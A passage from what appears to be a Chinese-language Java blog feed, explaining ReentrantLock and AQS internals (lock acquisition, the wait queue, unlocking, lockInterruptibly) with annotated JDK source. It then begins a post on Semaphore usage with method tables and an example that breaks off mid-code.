setExclusiveOwnerThread(current);</span><br><span class="line">                  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">//如果锁不空闲 判断此刻拥有锁的线程是否是本线程</span></span><br><span class="line">          <span class="comment">//重入锁的原理</span></span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> (current == getExclusiveOwnerThread()) &#123;</span><br><span class="line">              <span class="comment">//锁状态+1</span></span><br><span class="line">              <span class="type">int</span> <span class="variable">nextc</span> <span class="operator">=</span> c + acquires;</span><br><span class="line">              <span class="keyword">if</span> (nextc &lt; <span class="number">0</span>)</span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Maximum lock count exceeded&quot;</span>);</span><br><span class="line">              <span class="comment">//这里不使用CAS是因为</span></span><br><span class="line">              <span class="comment">//仅仅只会有本线程进入锁，不必担心并发问题</span></span><br><span class="line">              setState(nextc);</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">//如果锁不是空闲，又不是重入</span></span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>很清晰的获取锁的流程【单指公平锁。</p>
<p>接下来我们根据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//接下来我们看向addWaiter</span></span><br><span class="line"><span class="comment">//我们开看</span></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 这里使用的是同步等待队列</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">private</span> Node <span class="title function_">addWaiter</span><span class="params">(Node mode)</span> &#123;</span><br><span class="line">       <span class="comment">//new一个节点</span></span><br><span class="line">       <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(Thread.currentThread(), mode);</span><br><span class="line">       <span class="comment">// Try the fast path of enq; backup to full enq on failure</span></span><br><span class="line">       <span class="type">Node</span> <span class="variable">pred</span> <span class="operator">=</span> tail;</span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * 这里通过尾节点是否为空判断是否需要初始化操作</span></span><br><span class="line"><span class="comment">        * 初始化的话直接进入enq函数</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       <span class="keyword">if</span> (pred != <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="comment">//如果不需要初始化节点就会进入此处</span></span><br><span class="line">           <span class="comment">//其实和enq里的类似</span></span><br><span class="line">           node.prev = pred;</span><br><span class="line">           <span class="keyword">if</span> (compareAndSetTail(pred, node)) &#123;</span><br><span class="line">               pred.next = node;</span><br><span class="line">               <span class="comment">//这里会直接返回的！！</span></span><br><span class="line">               <span class="keyword">return</span> node;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       enq(node);</span><br><span class="line">       <span class="keyword">return</span> node;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//这里是初始化才会进入这里</span></span><br><span class="line">   <span class="keyword">private</span> Node <span class="title function_">enq</span><span class="params">(<span class="keyword">final</span> Node node)</span> &#123;</span><br><span class="line">       <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">           <span class="comment">//这里自旋</span></span><br><span class="line">           <span class="type">Node</span> <span class="variable">t</span> <span class="operator">=</span> tail;</span><br><span class="line">           <span class="comment">//尾指针为空，那么初始化一个空节点</span></span><br><span class="line">           <span class="comment">//使得首尾指针都指向这个空节点</span></span><br><span class="line">           <span class="keyword">if</span> (t == <span class="literal">null</span>) &#123; <span class="comment">// Must initialize</span></span><br><span class="line">               <span class="keyword">if</span> (compareAndSetHead(<span class="keyword">new</span> <span class="title class_">Node</span>()))</span><br><span class="line">                   tail = head;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="comment">//不为空说明我们已经初始化好了</span></span><br><span class="line">               node.prev = t;</span><br><span class="line">               <span class="comment">//设置尾节点为node</span></span><br><span class="line">               <span class="keyword">if</span> (compareAndSetTail(t, node)) &#123;</span><br><span class="line">                   <span class="comment">//使得前面节点和node链接</span></span><br><span class="line">                   t.next = node;</span><br><span class="line">                   <span class="keyword">return</span> t;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//前面是把该线程放入同步等待队列</span></span><br><span class="line">   <span class="comment">//现在是把该线程进行阻塞</span></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 注意有个特点</span></span><br><span class="line"><span class="comment">    * 如果你是同步等待队列中的第一个线程</span></span><br><span class="line"><span class="comment">    * 那么不是直接阻塞，是看看还有机会获得锁吗？</span></span><br><span class="line"><span class="comment">    * 如果没有机会才阻塞</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">acquireQueued</span><span class="params">(<span class="keyword">final</span> Node node, <span class="type">int</span> arg)</span> &#123;</span><br><span class="line">       <span class="type">boolean</span> <span class="variable">failed</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="type">boolean</span> <span class="variable">interrupted</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">           <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">               <span class="comment">//自旋</span></span><br><span class="line">               <span class="keyword">final</span> <span class="type">Node</span> <span class="variable">p</span> <span class="operator">=</span> node.predecessor();</span><br><span class="line">               <span class="comment">//判断是否是同步等待队列的第一个线程</span></span><br><span class="line">               <span class="comment">//如果是的话 会 tryAcquire(arg)</span></span><br><span class="line">               <span class="keyword">if</span> (p == head &amp;&amp; tryAcquire(arg)) &#123;</span><br><span class="line">                   <span class="comment">//因为进入此处</span></span><br><span class="line">                   <span class="comment">//代表已经获得锁了</span></span><br><span class="line">                   <span class="comment">//那么需要把该节点从同步等待队列中丢弃</span></span><br><span class="line">                   setHead(node);</span><br><span class="line">                   p.next = <span class="literal">null</span>; <span class="comment">// help GC</span></span><br><span class="line">                   failed = <span class="literal">false</span>;</span><br><span class="line">                   <span class="keyword">return</span> interrupted;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="comment">//由于不是第一个线程，故而直接阻塞</span></span><br><span class="line">               <span class="keyword">if</span> (shouldParkAfterFailedAcquire(p, node) &amp;&amp;</span><br><span class="line">                   parkAndCheckInterrupt())</span><br><span class="line">                   <span class="comment">//如果是被中断唤醒的，那么设为true</span></span><br><span class="line">                   interrupted = <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="comment">//最终会判断是否获取到了锁？</span></span><br><span class="line">           <span class="comment">//如果没获取到，说明这个线程走到这里是由于别的问题产生的！</span></span><br><span class="line">           <span class="keyword">if</span> (failed)</span><br><span class="line">               cancelAcquire(node);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>我们已经分析完了从获取锁到如何进入等待队列，到阻塞线程。</p>
<p>其中阻塞线程我们可以在深究一下。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  <span class="comment">//这里会对同步等待队列中的waitStatus</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">shouldParkAfterFailedAcquire</span><span class="params">(Node pred, Node node)</span> &#123;</span><br><span class="line">      </span><br><span class="line">      <span class="type">int</span> <span class="variable">ws</span> <span class="operator">=</span> pred.waitStatus;</span><br><span class="line"><span class="comment">//判断这里是否为-1</span></span><br><span class="line">      <span class="keyword">if</span> (ws == Node.SIGNAL)</span><br><span class="line">          <span class="comment">//如果这里是-1，那么就直接返回</span></span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">if</span> (ws &gt; <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">           * Predecessor was cancelled. Skip over predecessors and</span></span><br><span class="line"><span class="comment">           * indicate retry.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line">          <span class="keyword">do</span> &#123;</span><br><span class="line">              node.prev = pred = pred.prev;</span><br><span class="line">          &#125; <span class="keyword">while</span> (pred.waitStatus &gt; <span class="number">0</span>);</span><br><span class="line">          pred.next = node;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">//如果这里为0，那么我们将其转为-1</span></span><br><span class="line">          compareAndSetWaitStatus(pred, ws, Node.SIGNAL);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">parkAndCheckInterrupt</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="comment">//这里是把线程阻塞</span></span><br><span class="line">      LockSupport.park(<span class="built_in">this</span>);</span><br><span class="line">      <span class="comment">//被唤醒是有多种可能</span></span><br><span class="line">      <span class="comment">//比如API唤醒，或者被中断</span></span><br><span class="line">      <span class="comment">//如果是被中断唤醒的话，中断信号应该为true</span></span><br><span class="line"><span class="comment">//这里是返回是否被中断</span></span><br><span class="line">      <span class="keyword">return</span> Thread.interrupted();</span><br><span class="line">  &#125; </span><br></pre></td></tr></table></figure>

<p>我们看到了最终是阻塞在<code>parkAndCheckInterrupt</code></p>
<p>在这个自旋中</p>
<blockquote>
<p><code>waitestate = 0 - &gt; -1</code> head节点为什么改到-1</p>
</blockquote>
<p>因为持有锁的线程T0在释放锁的时候，得判断head节点的<code>waitestate</code>是否<code>!=0,</code>如果<code>！=0</code>成立，会再把<code>waitstate = -1-&gt;0</code></p>
<h2 id="解锁"><a href="#解锁" class="headerlink" title="解锁"></a>解锁</h2><p>接下来我们看解锁过程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//一.解锁</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unlock</span><span class="params">()</span> &#123;</span><br><span class="line">       sync.release(<span class="number">1</span>);</span><br><span class="line">   &#125; </span><br><span class="line"><span class="comment">// 二.释放锁的方法</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">release</span><span class="params">(<span class="type">int</span> arg)</span> &#123;</span><br><span class="line">       <span class="comment">// 调用tryRelease判断是否锁空闲</span></span><br><span class="line">       <span class="keyword">if</span> (tryRelease(arg)) &#123;</span><br><span class="line">           <span class="comment">// 如果锁空闲，说明可以让其他线程获取锁</span></span><br><span class="line">           <span class="type">Node</span> <span class="variable">h</span> <span class="operator">=</span> head;</span><br><span class="line">           <span class="comment">// 如果头节点不为空，并且状态不为0，说明后面节点可以唤醒</span></span><br><span class="line">           <span class="keyword">if</span> (h != <span class="literal">null</span> &amp;&amp; h.waitStatus != <span class="number">0</span>)</span><br><span class="line">               <span class="comment">// 唤醒头节点后第一个满足条件的节点</span></span><br><span class="line">               unparkSuccessor(h);</span><br><span class="line">           <span class="comment">//这里说明某个线程被唤醒了</span></span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//解锁</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">unparkSuccessor</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * If status is negative (i.e., possibly needing signal) try</span></span><br><span class="line"><span class="comment">        * to clear in anticipation of signalling.  It is OK if this</span></span><br><span class="line"><span class="comment">        * fails or if status is changed by waiting thread.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">ws</span> <span class="operator">=</span> node.waitStatus;</span><br><span class="line">       <span class="keyword">if</span> (ws &lt; <span class="number">0</span>)</span><br><span class="line">           compareAndSetWaitStatus(node, ws, <span class="number">0</span>);</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * Thread to unpark is held in successor, which is normally</span></span><br><span class="line"><span class="comment">        * just the next node.  But if cancelled or apparently null,</span></span><br><span class="line"><span class="comment">        * traverse backwards from tail to find the actual</span></span><br><span class="line"><span class="comment">        * non-cancelled successor.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       <span class="type">Node</span> <span class="variable">s</span> <span class="operator">=</span> node.next;</span><br><span class="line">       <span class="keyword">if</span> (s == <span class="literal">null</span> || s.waitStatus &gt; <span class="number">0</span>) &#123;</span><br><span class="line">           s = <span class="literal">null</span>;</span><br><span class="line">           <span class="keyword">for</span> (<span class="type">Node</span> <span class="variable">t</span> <span class="operator">=</span> tail; t != <span class="literal">null</span> &amp;&amp; t != node; t = t.prev)</span><br><span class="line">               <span class="keyword">if</span> (t.waitStatus &lt;= <span class="number">0</span>)</span><br><span class="line">                   s = t;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (s != <span class="literal">null</span>)</span><br><span class="line">           <span class="comment">//这里是真正的解锁！！</span></span><br><span class="line">           LockSupport.unpark(s.thread);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code> unparkSuccessor(h);</code></p>
<p>看得出来这里是把头节点带入函数中，也就是说判断head节点的<code>waitestate</code>是否<code>!=0</code>,如果<code>！=0</code>成立，会再把<code>waitstate = -1-&gt;0</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Sync</span> <span class="keyword">extends</span> <span class="title class_">AbstractQueuedSynchronizer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">5179523762034025860L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">tryRelease</span><span class="params">(<span class="type">int</span> releases)</span> &#123;</span><br><span class="line">        <span class="comment">// 状态变换</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> getState() - releases;</span><br><span class="line">        <span class="comment">// 当前线程不是锁持有线程，那么就抛出异常</span></span><br><span class="line">        <span class="keyword">if</span> (Thread.currentThread() != getExclusiveOwnerThread())</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalMonitorStateException</span>();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">free</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">//如果锁状态为空闲</span></span><br><span class="line">        <span class="keyword">if</span> (c == <span class="number">0</span>) &#123;</span><br><span class="line">            free = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">//设置锁持有线程为null</span></span><br><span class="line">            setExclusiveOwnerThread(<span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        setState(c);</span><br><span class="line">        <span class="keyword">return</span> free;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="lockInterruptibly"><a href="#lockInterruptibly" class="headerlink" title="lockInterruptibly()"></a>lockInterruptibly()</h2><p><code>lockInterruptibly()</code>也是<code>Lock</code>的一种加锁方式</p>
<blockquote>
<p>在普通的LockSupport.park()会判断是否有中断标记，如果有，那么不用阻塞。</p>
</blockquote>
<p>利用<code>LockSupport.park()</code>响应中断不会抛出异常的特性，之前的lock方法中，线程在被中断唤醒并且成功抢到锁后，只会修改线程的中断标记为true。</p>
<p>而使用lockInterruptibly方法加锁，一旦线程被中断唤醒，线程状态就会被标记为<code>CANCELLED</code>，从队伍中被剔除并且抛出异常。</p>
<p>话不多说，直接看源码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="comment">//标准操作</span></span><br><span class="line"><span class="comment">//注意到这里有抛出中断异常</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lockInterruptibly</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">       <span class="comment">//照旧调用sync</span></span><br><span class="line">       sync.acquireInterruptibly(<span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//开始操作</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">acquireInterruptibly</span><span class="params">(<span class="type">int</span> arg)</span></span><br><span class="line">           <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">       <span class="comment">//如果被中断了，那么直接抛异常 </span></span><br><span class="line">       <span class="keyword">if</span> (Thread.interrupted())</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InterruptedException</span>();</span><br><span class="line">       <span class="comment">//否则就尝试获取锁</span></span><br><span class="line">       <span class="comment">//如果获取不成功，那么进入代码</span></span><br><span class="line">       <span class="keyword">if</span> (!tryAcquire(arg))</span><br><span class="line">           doAcquireInterruptibly(arg);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//核心</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">doAcquireInterruptibly</span><span class="params">(<span class="type">int</span> arg)</span></span><br><span class="line">       <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">       <span class="comment">//把线程加入同步等待队列</span></span><br><span class="line">       <span class="keyword">final</span> <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> addWaiter(Node.EXCLUSIVE);</span><br><span class="line">       <span class="type">boolean</span> <span class="variable">failed</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">//开始自旋！！</span></span><br><span class="line">           <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">               <span class="comment">//看头节点</span></span><br><span class="line">               <span class="keyword">final</span> <span class="type">Node</span> <span class="variable">p</span> <span class="operator">=</span> node.predecessor();</span><br><span class="line">               <span class="comment">//如果可以就尝试获取锁</span></span><br><span class="line">               <span class="keyword">if</span> (p == head &amp;&amp; tryAcquire(arg)) &#123;</span><br><span class="line">                   setHead(node);</span><br><span class="line">                   p.next = <span class="literal">null</span>; <span class="comment">// help GC</span></span><br><span class="line">                   failed = <span class="literal">false</span>;</span><br><span class="line">                   <span class="keyword">return</span>;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="comment">//这里就是常态了，和lock的那个类似</span></span><br><span class="line">               <span class="keyword">if</span> (shouldParkAfterFailedAcquire(p, node) &amp;&amp;</span><br><span class="line">                   parkAndCheckInterrupt())</span><br><span class="line">                   <span class="comment">//差别在这里，一旦出现中断</span></span><br><span class="line">                   <span class="comment">//那么直接抛出异常，而不是接着获取锁</span></span><br><span class="line">                   <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InterruptedException</span>();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="comment">//由于中断，所以会把failed是true，会进入if代码中</span></span><br><span class="line">           <span class="keyword">if</span> (failed)</span><br><span class="line">               <span class="comment">// 将当前线程节点从队列中剔除</span></span><br><span class="line">               <span class="comment">//此时没有获取锁</span></span><br><span class="line">               cancelAcquire(node);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 将当前线程节点从队列中剔除的方法</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">cancelAcquire</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (node == <span class="literal">null</span>)</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       <span class="comment">// 当前节点中的thread置为null</span></span><br><span class="line">       node.thread = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 获取当前节点的前驱节点</span></span><br><span class="line">       <span class="type">Node</span> <span class="variable">pred</span> <span class="operator">=</span> node.prev;</span><br><span class="line">       <span class="comment">// 找到队伍中连续状态为CANCELLED的第一个节点的前驱结点pred</span></span><br><span class="line">       <span class="keyword">while</span> (pred.waitStatus &gt; <span class="number">0</span>)</span><br><span class="line">           node.prev = pred = pred.prev;</span><br><span class="line">       <span class="comment">// predNext为队伍中连续状态为CANCELLED的第一个节点</span></span><br><span class="line">       <span class="type">Node</span> <span class="variable">predNext</span> <span class="operator">=</span> pred.next;</span><br><span class="line">       <span class="comment">// 当前节点的状态设置为CANCELLED</span></span><br><span class="line">       node.waitStatus = Node.CANCELLED;</span><br><span class="line">       <span class="comment">// 以下操作把pedfNext到node的所有结点从队中剔除,因为这些结点的状态均为CANCELLED</span></span><br><span class="line">       <span class="keyword">if</span> (node == tail &amp;&amp; compareAndSetTail(node, pred)) &#123;</span><br><span class="line">           <span class="comment">// 1.如果node是队尾,将pred(predNext的前驱节点)设为队尾</span></span><br><span class="line">           compareAndSetNext(pred, predNext, <span class="literal">null</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="type">int</span> ws;</span><br><span class="line">           <span class="comment">// 2.如果pred不是队头</span></span><br><span class="line">           <span class="keyword">if</span> (pred != head &amp;&amp;</span><br><span class="line">               <span class="comment">// 并且pred的状态不为(-1)</span></span><br><span class="line">               ((ws = pred.waitStatus) == Node.SIGNAL ||</span><br><span class="line">               <span class="comment">// 或者pred的状态&lt;=0(0)并且CAS将其替换为-1成功</span></span><br><span class="line">               (ws &lt;= <span class="number">0</span> &amp;&amp; compareAndSetWaitStatus(pred, ws, Node.SIGNAL))) &amp;&amp;</span><br><span class="line">               <span class="comment">// 并且pred中的thread不为空</span></span><br><span class="line">               pred.thread != <span class="literal">null</span>) &#123;</span><br><span class="line">               <span class="comment">// 获取node的后继节点next</span></span><br><span class="line">               <span class="type">Node</span> <span class="variable">next</span> <span class="operator">=</span> node.next;</span><br><span class="line">               <span class="comment">// 如果next不为空且状态&lt;=0</span></span><br><span class="line">               <span class="keyword">if</span> (next != <span class="literal">null</span> &amp;&amp; next.waitStatus &lt;= <span class="number">0</span>)</span><br><span class="line">                   <span class="comment">// 将pred的后继节点设置为next</span></span><br><span class="line">                   compareAndSetNext(pred, predNext, next);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="comment">// 3.如果node是队头，调用unparkSuccessor方法唤醒node后第一个满足条件的节点</span></span><br><span class="line">               unparkSuccessor(node);</span><br><span class="line">           &#125;</span><br><span class="line">   </span><br><span class="line">           node.next = node; </span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">// 唤醒当前节点满足条件的后继节点</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">unparkSuccessor</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">       </span><br><span class="line">       <span class="type">int</span> <span class="variable">ws</span> <span class="operator">=</span> node.waitStatus;</span><br><span class="line">       <span class="keyword">if</span> (ws &lt; <span class="number">0</span>)</span><br><span class="line">           <span class="comment">// 将node节点的状态置为0</span></span><br><span class="line">           compareAndSetWaitStatus(node, ws, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 获取node的后继节点s</span></span><br><span class="line">       <span class="type">Node</span> <span class="variable">s</span> <span class="operator">=</span> node.next;</span><br><span class="line">       <span class="comment">// 如果s为空或者s的状态为CANCELLED</span></span><br><span class="line">       <span class="keyword">if</span> (s == <span class="literal">null</span> || s.waitStatus &gt; <span class="number">0</span>) &#123;</span><br><span class="line">           s = <span class="literal">null</span>;</span><br><span class="line">           <span class="comment">// 找到node后面第一个状态小于0(-1)的节点t</span></span><br><span class="line">           <span class="keyword">for</span> (<span class="type">Node</span> <span class="variable">t</span> <span class="operator">=</span> tail; t != <span class="literal">null</span> &amp;&amp; t != node; t = t.prev)</span><br><span class="line">               <span class="keyword">if</span> (t.waitStatus &lt;= <span class="number">0</span>)</span><br><span class="line">                   <span class="comment">// 将t赋值给s</span></span><br><span class="line">                   s = t;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (s != <span class="literal">null</span>)</span><br><span class="line">           <span class="comment">// 将s唤醒</span></span><br><span class="line">           LockSupport.unpark(s.thread);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>简单来说，<code>lock </code>与 <code>lockInterruptibly </code>区别在于：</p>
<p><code>lock </code>优先考虑获取锁，待获取锁成功后，才响应中断；</p>
<p><code>lock</code>的中断处理是在<code>acquire</code>方法中加上了中断信号标志而已。</p>
<p>而<code>lockInterruptibly </code>优先考虑响应中断，一旦中断就不再继续获取锁</p>
<p>他的中断处理是我不要锁了，直接把这个线程中断，然后删除种种信息。</p>
<p>偏重点不同。</p>
]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>CountDownLatch&amp;Semaphore</title>
    <url>/2021/05/03/2021/CountDownLatch-Semaphore/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Semaphore"><a href="#Semaphore" class="headerlink" title="Semaphore"></a>Semaphore</h1><p>Semaphore 字面意思是信号量的意思，它的作用是控制访问特定资源的线程数目，底层依赖AQS的状态State，是在生产当中比较常用的一个工具类。</p>
<h1 id="使用-Semaphore"><a href="#使用-Semaphore" class="headerlink" title="使用 Semaphore"></a><strong>使用 Semaphore</strong></h1><h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a><strong>构造方法</strong></h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Semaphore</span><span class="params">(<span class="type">int</span> <span class="keyword">permits</span>)</span> </span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Semaphore</span><span class="params">(<span class="type">int</span> <span class="keyword">permits</span>, <span class="type">boolean</span> fair)</span>             </span><br></pre></td></tr></table></figure>

<ul>
<li>permits 表示许可线程的数量</li>
<li>fair 表示公平性，如果这个设为 true 的话，下次执行的线程会是等待最久的线程</li>
</ul>
<h2 id="重要方法"><a href="#重要方法" class="headerlink" title="重要方法"></a><strong>重要方法</strong></h2><ul>
<li>构造方法</li>
</ul>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Semaphore(int permits)</td>
<td>permits 表示许可线程的数量</td>
</tr>
<tr>
<td>Semaphore(int permits, boolean fair)</td>
<td>fair 表示公平性，如果设为 true ，下次执行的线程会是等待最久的线</td>
</tr>
</tbody></table>
<ul>
<li>获取信号量</li>
</ul>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>acquire()</td>
<td>获取一个信号量，如果线程被中断会抛异常</td>
</tr>
<tr>
<td>acquire(int permits)</td>
<td>获取permits个信号量</td>
</tr>
<tr>
<td>acquireUninterruptibly()</td>
<td>获取一个信号量，如果线程被中断不会抛异常</td>
</tr>
<tr>
<td>acquireUninterruptibly(int permits)</td>
<td>获取permits个信号量</td>
</tr>
<tr>
<td>tryAcquire(long timeout, TimeUnit unit)</td>
<td>尝试获取信号量，timeout时间后未获取到返回false</td>
</tr>
<tr>
<td>tryAcquire(int permits, long timeout, TimeUnit unit)</td>
<td>获取permits个信号量</td>
</tr>
</tbody></table>
<ul>
<li>释放信号量</li>
</ul>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>release()</td>
<td>释放一个信号量</td>
</tr>
<tr>
<td>release(int permits)</td>
<td>释放permits个信号量</td>
</tr>
</tbody></table>
<h1 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h1><p>Semaphore可以用于做流量控制，特别是公用资源有限的应用场景。假如当前有10个线程同时请求我们的服务，但是我们服务最多能承受的并发量为2，我们通过<code>Semaphore</code>对流量进行控制：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Basic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Semaphore;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>:</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Liduoan</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@time</span>: 2021/5/5</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Semp</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="type">Semaphore</span> <span class="variable">semaphore</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Semaphore</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Thread1</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span 